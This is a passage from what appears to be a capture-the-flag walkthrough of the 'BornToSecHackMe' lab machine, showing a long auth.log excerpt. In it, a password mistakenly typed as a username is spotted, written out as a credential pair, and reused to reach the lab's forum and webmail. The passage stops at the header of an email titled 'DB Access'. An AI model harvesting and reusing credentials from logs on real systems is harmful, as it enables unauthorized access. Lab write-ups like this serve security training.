Oct 5 11:39:01 BornToSecHackMe CRON[15201]: pam_unix(cron:session): session closed for user root
Oct 5 11:39:01 BornToSecHackMe CRON[15200]: pam_unix(cron:session): session closed for user root
Oct 5 11:40:01 BornToSecHackMe CRON[15251]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:40:01 BornToSecHackMe CRON[15251]: pam_unix(cron:session): session closed for user root
Oct 5 11:41:01 BornToSecHackMe CRON[15294]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:41:01 BornToSecHackMe CRON[15294]: pam_unix(cron:session): session closed for user root
Oct 5 11:42:01 BornToSecHackMe CRON[15337]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:42:01 BornToSecHackMe CRON[15337]: pam_unix(cron:session): session closed for user root
Oct 5 11:43:01 BornToSecHackMe CRON[15380]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:43:01 BornToSecHackMe CRON[15380]: pam_unix(cron:session): session closed for user root
Oct 5 11:44:01 BornToSecHackMe CRON[15423]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:44:01 BornToSecHackMe CRON[15423]: pam_unix(cron:session): session closed for user root
Oct 5 11:45:01 BornToSecHackMe CRON[15466]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:45:01 BornToSecHackMe CRON[15466]: pam_unix(cron:session): session closed for user root
Oct 5 11:46:01 BornToSecHackMe CRON[15509]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:46:01 BornToSecHackMe CRON[15509]: pam_unix(cron:session): session closed for user root
Oct 5 11:47:01 BornToSecHackMe CRON[15552]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:47:01 BornToSecHackMe CRON[15552]: pam_unix(cron:session): session closed for user root
Oct 5 11:48:01 BornToSecHackMe CRON[15595]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:48:01 BornToSecHackMe CRON[15595]: pam_unix(cron:session): session closed for user root
Oct 5 11:49:01 BornToSecHackMe CRON[15638]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:49:01 BornToSecHackMe CRON[15638]: pam_unix(cron:session): session closed for user root
Oct 5 11:50:01 BornToSecHackMe CRON[15681]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:50:01 BornToSecHackMe CRON[15681]: pam_unix(cron:session): session closed for user root
Oct 5 11:51:01 BornToSecHackMe CRON[15724]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:51:01 BornToSecHackMe CRON[15724]: pam_unix(cron:session): session closed for user root
Oct 5 11:52:01 BornToSecHackMe CRON[15767]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:52:01 BornToSecHackMe CRON[15767]: pam_unix(cron:session): session closed for user root
Oct 5 11:53:01 BornToSecHackMe CRON[15810]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:53:02 BornToSecHackMe CRON[15810]: pam_unix(cron:session): session closed for user root
Oct 5 11:54:01 BornToSecHackMe CRON[15853]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:28:01 BornToSecHackMe CRON[20026]: pam_unix(cron:session): session closed for user root
Oct 5 13:29:01 BornToSecHackMe CRON[20069]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:29:01 BornToSecHackMe CRON[20069]: pam_unix(cron:session): session closed for user root
Oct 5 13:30:01 BornToSecHackMe CRON[20113]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:30:01 BornToSecHackMe CRON[20113]: pam_unix(cron:session): session closed for user root
Oct 5 13:31:01 BornToSecHackMe CRON[20156]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:31:01 BornToSecHackMe CRON[20156]: pam_unix(cron:session): session closed for user root
Oct 5 13:31:19 BornToSecHackMe sshd[20199]: reverse mapping checking getaddrinfo for ppp-253-14.20-151.wind.it [151.20.14.253] failed - POSSIBLE BREAK-IN ATTEMPT!
Oct 5 13:31:19 BornToSecHackMe sshd[20199]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=151.20.14.253 user=root
Oct 5 13:31:20 BornToSecHackMe sshd[20199]: Failed password for root from 151.20.14.253 port 54939 ssh2
Oct 5 13:31:21 BornToSecHackMe sshd[20199]: Connection closed by 151.20.14.253 [preauth]
Oct 5 13:32:01 BornToSecHackMe CRON[20201]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:32:01 BornToSecHackMe CRON[20201]: pam_unix(cron:session): session closed for user root
Oct 5 13:33:01 BornToSecHackMe CRON[20244]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:33:01 BornToSecHackMe CRON[20244]: pam_unix(cron:session): session closed for user root
Oct 5 13:34:01 BornToSecHackMe CRON[20287]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:34:01 BornToSecHackMe CRON[20287]: pam_unix(cron:session): session closed for user root
Oct 5 13:35:01 BornToSecHackMe CRON[20330]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:35:01 BornToSecHackMe CRON[20330]: pam_unix(cron:session): session closed for user root
Oct 5 13:36:01 BornToSecHackMe CRON[20373]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:36:01 BornToSecHackMe CRON[20373]: pam_unix(cron:session): session closed for user root
Oct 5 13:37:01 BornToSecHackMe CRON[20416]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:37:01 BornToSecHackMe CRON[20416]: pam_unix(cron:session): session closed for user root
Oct 5 13:38:01 BornToSecHackMe CRON[20459]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:38:01 BornToSecHackMe CRON[20459]: pam_unix(cron:session): session closed for user root
Oct 5 13:39:01 BornToSecHackMe CRON[20502]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 13:39:01 BornToSecHackMe CRON[20503]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:17:04 BornToSecHackMe CRON[22152]: pam_unix(cron:session): session closed for user root
Oct 5 14:18:01 BornToSecHackMe CRON[22238]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:18:01 BornToSecHackMe CRON[22238]: pam_unix(cron:session): session closed for user root
Oct 5 14:19:01 BornToSecHackMe CRON[22281]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:19:01 BornToSecHackMe CRON[22281]: pam_unix(cron:session): session closed for user root
Oct 5 14:20:01 BornToSecHackMe CRON[22324]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:20:01 BornToSecHackMe CRON[22324]: pam_unix(cron:session): session closed for user root
Oct 5 14:20:26 BornToSecHackMe sshd[22367]: Invalid user admin from 46.159.82.56
Oct 5 14:20:26 BornToSecHackMe sshd[22367]: input_userauth_request: invalid user admin [preauth]
Oct 5 14:20:26 BornToSecHackMe sshd[22367]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 14:20:26 BornToSecHackMe sshd[22367]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=46.159.82.56
Oct 5 14:20:27 BornToSecHackMe sshd[22367]: Failed password for invalid user admin from 46.159.82.56 port 38179 ssh2
Oct 5 14:20:28 BornToSecHackMe sshd[22367]: Connection closed by 46.159.82.56 [preauth]
Oct 5 14:21:01 BornToSecHackMe CRON[22369]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:21:01 BornToSecHackMe CRON[22369]: pam_unix(cron:session): session closed for user root
Oct 5 14:22:01 BornToSecHackMe CRON[22412]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:22:01 BornToSecHackMe CRON[22412]: pam_unix(cron:session): session closed for user root
Oct 5 14:23:01 BornToSecHackMe CRON[22455]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:40:02 BornToSecHackMe CRON[23196]: pam_unix(cron:session): session closed for user root
Oct 5 14:40:37 BornToSecHackMe sshd[23239]: Received disconnect from 222.122.118.49: 11: Bye Bye [preauth]
Oct 5 14:41:02 BornToSecHackMe CRON[23241]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:41:02 BornToSecHackMe CRON[23241]: pam_unix(cron:session): session closed for user root
Oct 5 14:42:01 BornToSecHackMe CRON[23284]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:42:01 BornToSecHackMe CRON[23284]: pam_unix(cron:session): session closed for user root
Oct 5 14:43:01 BornToSecHackMe CRON[23327]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:43:01 BornToSecHackMe CRON[23327]: pam_unix(cron:session): session closed for user root
Oct 5 14:44:01 BornToSecHackMe CRON[23370]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:44:01 BornToSecHackMe CRON[23370]: pam_unix(cron:session): session closed for user root
Oct 5 14:45:01 BornToSecHackMe CRON[23413]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:45:01 BornToSecHackMe CRON[23413]: pam_unix(cron:session): session closed for user root
Oct 5 14:46:01 BornToSecHackMe CRON[23456]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:46:01 BornToSecHackMe CRON[23456]: pam_unix(cron:session): session closed for user root
Oct 5 14:46:43 BornToSecHackMe sshd[23499]: Received disconnect from 113.199.73.28: 11: Bye Bye [preauth]
Oct 5 14:47:01 BornToSecHackMe CRON[23501]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:47:01 BornToSecHackMe CRON[23501]: pam_unix(cron:session): session closed for user root
Oct 5 14:48:01 BornToSecHackMe CRON[23544]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:48:01 BornToSecHackMe CRON[23544]: pam_unix(cron:session): session closed for user root
Oct 5 14:49:01 BornToSecHackMe CRON[23587]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:49:01 BornToSecHackMe CRON[23587]: pam_unix(cron:session): session closed for user root
Oct 5 14:50:01 BornToSecHackMe CRON[23630]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:50:01 BornToSecHackMe CRON[23630]: pam_unix(cron:session): session closed for user root
Oct 5 14:51:01 BornToSecHackMe CRON[23673]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:51:01 BornToSecHackMe CRON[23673]: pam_unix(cron:session): session closed for user root
Oct 5 14:52:01 BornToSecHackMe CRON[23716]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:52:01 BornToSecHackMe CRON[23716]: pam_unix(cron:session): session closed for user root
Oct 5 14:53:01 BornToSecHackMe CRON[23759]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:53:01 BornToSecHackMe CRON[23759]: pam_unix(cron:session): session closed for user root
Oct 5 14:54:00 BornToSecHackMe sshd[23804]: Accepted password for admin from 62.210.32.157 port 61495 ssh2
Oct 5 14:54:00 BornToSecHackMe sshd[23804]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 14:54:01 BornToSecHackMe CRON[24053]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:54:01 BornToSecHackMe CRON[24053]: pam_unix(cron:session): session closed for user root
Oct 5 14:54:17 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=1000)
Oct 5 14:54:18 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 14:54:29 BornToSecHackMe sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/sh
Oct 5 14:54:29 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=1000)
Oct 5 14:55:01 BornToSecHackMe CRON[24109]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:55:01 BornToSecHackMe CRON[24109]: pam_unix(cron:session): session closed for user root
Oct 5 14:56:01 BornToSecHackMe CRON[24152]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:56:01 BornToSecHackMe CRON[24152]: pam_unix(cron:session): session closed for user root
Oct 5 14:56:49 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)
Oct 5 14:56:49 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 14:56:55 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)
Oct 5 14:56:55 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 14:57:02 BornToSecHackMe CRON[24211]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:57:02 BornToSecHackMe CRON[24211]: pam_unix(cron:session): session closed for user root
Oct 5 14:57:56 BornToSecHackMe sudo: root : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/service vsftpd restart
Oct 5 14:57:56 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)
Oct 5 14:57:56 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 14:58:01 BornToSecHackMe CRON[24274]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:58:01 BornToSecHackMe CRON[24274]: pam_unix(cron:session): session closed for user root
Oct 5 14:59:01 BornToSecHackMe CRON[24317]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 14:59:01 BornToSecHackMe CRON[24317]: pam_unix(cron:session): session closed for user root
Oct 5 15:00:01 BornToSecHackMe CRON[24360]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:00:01 BornToSecHackMe CRON[24360]: pam_unix(cron:session): session closed for user root
Oct 5 15:01:01 BornToSecHackMe CRON[24403]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:01:01 BornToSecHackMe CRON[24403]: pam_unix(cron:session): session closed for user root
Oct 5 15:02:01 BornToSecHackMe CRON[24446]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:02:01 BornToSecHackMe CRON[24446]: pam_unix(cron:session): session closed for user root
Oct 5 15:03:01 BornToSecHackMe CRON[24496]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:03:01 BornToSecHackMe CRON[24496]: pam_unix(cron:session): session closed for user root
Oct 5 15:03:55 BornToSecHackMe sudo: root : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/service vsftpd restart
Oct 5 15:03:55 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)
Oct 5 15:03:55 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 15:04:01 BornToSecHackMe CRON[24577]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:04:01 BornToSecHackMe CRON[24577]: pam_unix(cron:session): session closed for user root
Oct 5 15:05:01 BornToSecHackMe CRON[24638]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:05:01 BornToSecHackMe CRON[24638]: pam_unix(cron:session): session closed for user root
Oct 5 15:06:01 BornToSecHackMe CRON[24681]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:06:01 BornToSecHackMe CRON[24681]: pam_unix(cron:session): session closed for user root
Oct 5 15:06:57 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 15:06:58 BornToSecHackMe sshd[24005]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:06:58 BornToSecHackMe sshd[23804]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:07:01 BornToSecHackMe CRON[24724]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:07:01 BornToSecHackMe CRON[24724]: pam_unix(cron:session): session closed for user root
Oct 5 15:07:24 BornToSecHackMe sshd[24767]: Accepted password for admin from 62.210.32.157 port 56050 ssh2
Oct 5 15:07:24 BornToSecHackMe sshd[24767]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:07:38 BornToSecHackMe sshd[24920]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:07:38 BornToSecHackMe sshd[24767]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:08:01 BornToSecHackMe CRON[24977]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:08:01 BornToSecHackMe CRON[24977]: pam_unix(cron:session): session closed for user root
Oct 5 15:08:49 BornToSecHackMe sshd[25020]: Accepted password for admin from 62.210.32.157 port 60098 ssh2
Oct 5 15:08:49 BornToSecHackMe sshd[25020]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:08:50 BornToSecHackMe sshd[25173]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:08:50 BornToSecHackMe sshd[25020]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:09:01 BornToSecHackMe CRON[25175]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:09:01 BornToSecHackMe CRON[25176]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:09:01 BornToSecHackMe CRON[25176]: pam_unix(cron:session): session closed for user root
Oct 5 15:09:01 BornToSecHackMe CRON[25175]: pam_unix(cron:session): session closed for user root
Oct 5 15:09:04 BornToSecHackMe sshd[25226]: Accepted password for admin from 62.210.32.157 port 50755 ssh2
Oct 5 15:09:04 BornToSecHackMe sshd[25226]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:09:05 BornToSecHackMe sshd[25379]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:09:05 BornToSecHackMe sshd[25226]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:09:14 BornToSecHackMe sshd[25381]: Accepted password for admin from 62.210.32.157 port 54025 ssh2
Oct 5 15:09:14 BornToSecHackMe sshd[25381]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:09:14 BornToSecHackMe sshd[25535]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:09:14 BornToSecHackMe sshd[25381]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:09:20 BornToSecHackMe sshd[25537]: Accepted password for admin from 62.210.32.157 port 64745 ssh2
Oct 5 15:09:20 BornToSecHackMe sshd[25537]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:09:20 BornToSecHackMe sshd[25690]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:09:20 BornToSecHackMe sshd[25537]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:09:32 BornToSecHackMe sshd[25692]: Accepted password for admin from 62.210.32.157 port 54511 ssh2
Oct 5 15:09:32 BornToSecHackMe sshd[25692]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:09:47 BornToSecHackMe sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/sh
Oct 5 15:09:47 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=1000)
Oct 5 15:10:00 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 15:10:01 BornToSecHackMe sshd[25845]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:10:01 BornToSecHackMe sshd[25692]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:10:01 BornToSecHackMe CRON[25901]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:10:01 BornToSecHackMe CRON[25901]: pam_unix(cron:session): session closed for user root
Oct 5 15:10:05 BornToSecHackMe sshd[25944]: Accepted password for admin from 62.210.32.157 port 51320 ssh2
Oct 5 15:10:05 BornToSecHackMe sshd[25944]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:10:10 BornToSecHackMe sshd[26097]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:10:10 BornToSecHackMe sshd[25944]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:10:34 BornToSecHackMe sshd[26099]: Accepted password for admin from 62.210.32.157 port 56349 ssh2
Oct 5 15:10:34 BornToSecHackMe sshd[26099]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:11:01 BornToSecHackMe CRON[26301]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:11:01 BornToSecHackMe CRON[26301]: pam_unix(cron:session): session closed for user root
Oct 5 15:11:06 BornToSecHackMe sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/sh
Oct 5 15:11:06 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=1000)
Oct 5 15:12:01 BornToSecHackMe CRON[26348]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:12:02 BornToSecHackMe CRON[26348]: pam_unix(cron:session): session closed for user root
Oct 5 15:13:01 BornToSecHackMe CRON[26392]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:13:01 BornToSecHackMe CRON[26392]: pam_unix(cron:session): session closed for user root
Oct 5 15:14:01 BornToSecHackMe CRON[26441]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:14:01 BornToSecHackMe CRON[26441]: pam_unix(cron:session): session closed for user root
Oct 5 15:15:01 BornToSecHackMe CRON[26488]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:15:01 BornToSecHackMe CRON[26488]: pam_unix(cron:session): session closed for user root
Oct 5 15:16:01 BornToSecHackMe CRON[26534]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:16:01 BornToSecHackMe CRON[26534]: pam_unix(cron:session): session closed for user root
Oct 5 15:17:01 BornToSecHackMe CRON[26578]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:17:01 BornToSecHackMe CRON[26577]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:17:01 BornToSecHackMe CRON[26578]: pam_unix(cron:session): session closed for user root
Oct 5 15:17:04 BornToSecHackMe CRON[26577]: pam_unix(cron:session): session closed for user root
Oct 5 15:18:01 BornToSecHackMe CRON[26663]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:18:01 BornToSecHackMe CRON[26663]: pam_unix(cron:session): session closed for user root
Oct 5 15:50:01 BornToSecHackMe CRON[28053]: pam_unix(cron:session): session closed for user root
Oct 5 15:51:01 BornToSecHackMe CRON[28096]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:51:01 BornToSecHackMe CRON[28096]: pam_unix(cron:session): session closed for user root
Oct 5 15:51:36 BornToSecHackMe sudo: pam_unix(sudo:session): session closed for user root
Oct 5 15:51:37 BornToSecHackMe sshd[26252]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:51:37 BornToSecHackMe sshd[26099]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:51:48 BornToSecHackMe sshd[28139]: Accepted password for admin from 62.210.32.157 port 54915 ssh2
Oct 5 15:51:48 BornToSecHackMe sshd[28139]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:51:48 BornToSecHackMe sshd[28292]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:51:48 BornToSecHackMe sshd[28139]: pam_unix(sshd:session): session closed for user admin
Oct 5 15:52:01 BornToSecHackMe CRON[28294]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:52:01 BornToSecHackMe CRON[28294]: pam_unix(cron:session): session closed for user root
Oct 5 15:52:11 BornToSecHackMe sshd[28337]: Accepted password for admin from 62.210.32.157 port 60970 ssh2
Oct 5 15:52:11 BornToSecHackMe sshd[28337]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:52:18 BornToSecHackMe sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/sh
Oct 5 15:52:18 BornToSecHackMe sudo: pam_unix(sudo:session): session opened for user root by admin(uid=1000)
Oct 5 15:53:01 BornToSecHackMe CRON[28544]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:53:01 BornToSecHackMe CRON[28544]: pam_unix(cron:session): session closed for user root
Oct 5 15:54:01 BornToSecHackMe CRON[28590]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:54:01 BornToSecHackMe CRON[28590]: pam_unix(cron:session): session closed for user root
Oct 5 15:55:01 BornToSecHackMe CRON[28634]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:55:01 BornToSecHackMe CRON[28634]: pam_unix(cron:session): session closed for user root
Oct 5 15:56:01 BornToSecHackMe CRON[28677]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:56:01 BornToSecHackMe CRON[28677]: pam_unix(cron:session): session closed for user root
Oct 5 15:57:01 BornToSecHackMe CRON[28720]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:57:01 BornToSecHackMe CRON[28720]: pam_unix(cron:session): session closed for user root
Oct 5 15:58:01 BornToSecHackMe CRON[28763]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:58:01 BornToSecHackMe CRON[28763]: pam_unix(cron:session): session closed for user root
Oct 5 15:59:01 BornToSecHackMe CRON[28806]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 15:59:02 BornToSecHackMe CRON[28806]: pam_unix(cron:session): session closed for user root
Oct 5 16:00:01 BornToSecHackMe CRON[28849]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:00:01 BornToSecHackMe CRON[28849]: pam_unix(cron:session): session closed for user root
Oct 5 16:01:01 BornToSecHackMe CRON[28892]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:01:01 BornToSecHackMe CRON[28892]: pam_unix(cron:session): session closed for user root
Oct 5 16:02:01 BornToSecHackMe CRON[28935]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:02:01 BornToSecHackMe CRON[28935]: pam_unix(cron:session): session closed for user root
Oct 5 16:03:01 BornToSecHackMe CRON[28979]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:03:01 BornToSecHackMe CRON[28979]: pam_unix(cron:session): session closed for user root
Oct 5 16:04:01 BornToSecHackMe CRON[29023]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:04:01 BornToSecHackMe CRON[29023]: pam_unix(cron:session): session closed for user root
Oct 5 16:05:01 BornToSecHackMe CRON[29068]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:05:01 BornToSecHackMe CRON[29068]: pam_unix(cron:session): session closed for user root
Oct 5 16:06:01 BornToSecHackMe CRON[29172]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:06:01 BornToSecHackMe CRON[29172]: pam_unix(cron:session): session closed for user root
Oct 5 16:07:01 BornToSecHackMe CRON[29216]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:07:01 BornToSecHackMe CRON[29216]: pam_unix(cron:session): session closed for user root
Oct 5 16:08:01 BornToSecHackMe CRON[29259]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 16:08:01 BornToSecHackMe CRON[29259]: pam_unix(cron:session): session closed for user root
Oct 5 17:22:01 BornToSecHackMe CRON[32732]: pam_unix(cron:session): session closed for user root
Oct 5 17:23:01 BornToSecHackMe CRON[507]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 17:23:01 BornToSecHackMe CRON[507]: pam_unix(cron:session): session closed for user root
Oct 5 17:24:01 BornToSecHackMe CRON[550]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 17:51:01 BornToSecHackMe CRON[1739]: pam_unix(cron:session): session closed for user root
Oct 5 17:51:15 BornToSecHackMe sshd[1782]: Accepted password for admin from 62.210.32.157 port 56754 ssh2
Oct 5 17:51:15 BornToSecHackMe sshd[1782]: pam_unix(sshd:session): session opened for user admin by (uid=0)
```

In summary, here we can see;

```
[...]
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from
161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
[...]
```

```
lmezard : !q\]Ej?*5K5cy*AJ
```

We try to log into the forum with this username and password.
After accessing our profile.

```
E-mail:	laurie@borntosec.net  
```

Now we try to log into the webmail directory we found earlier to see if we can get more information.

```
192.168.193.128/webmail
```

Here we find two emails. When we examine both of them;


```
Subject:  	Very interesting !!!!
From:  	qudevide@mail.borntosec.net
Date:  	Thu, October 8, 2015 10:22 pm
To:  	laurie@borntosec.net
Priority:  	Normal
Options:  	View Full Header |  View Printable Version  | Download this as a file


WinDev est un atelier de génie logiciel (AGL) édité par la société
française PC SOFT et conçu pour développer des applications,
principalement orientées données pour Windows 8, 7, Vista, XP, 2008, 2003,
2000, mais également pour Linux, .Net et Java. Il propose son propre
langage, appelé le WLangage. La première version de l'AGL est sortie en
1993. Apparenté à WebDev et WinDev Mobile.

La communauté autour de WinDev
Tour De France Technique
Chaque année, entre le mois de mars et le mois de mai, PC SOFT organise
dans toute la France ce qu'ils appellent le TDF Tech (Tour De France
Technique). Cet événement d'une demi-journée a pour but d'informer et de
présenter les nouveautés de chaque version. Pendant cette courte
formation, les différents intervenants utilisent un grand nombre
d'applications pré-conçues dans lesquelles ils ont intégré les multiples
nouveautés, tout en exploitant le matériel (serveurs, téléphones) qu'ils
ont apporté. Non seulement, WinDev est largement mis en avant, mais aussi
les autres environnements : WebDev et WinDev Mobile. Le code source des
sujets présentés ainsi qu'un support de cours sont remis à chaque
participant.
```

```
Subject:  	DB Access
From:  	qudevide@mail.borntosec.net
Date:  	Thu, October 8, 2015 10:25 pm
To:  	laurie@borntosec.net
Priority:  	Normal
Options:  	View Full Header |  View Printable Version  | Download this as a file

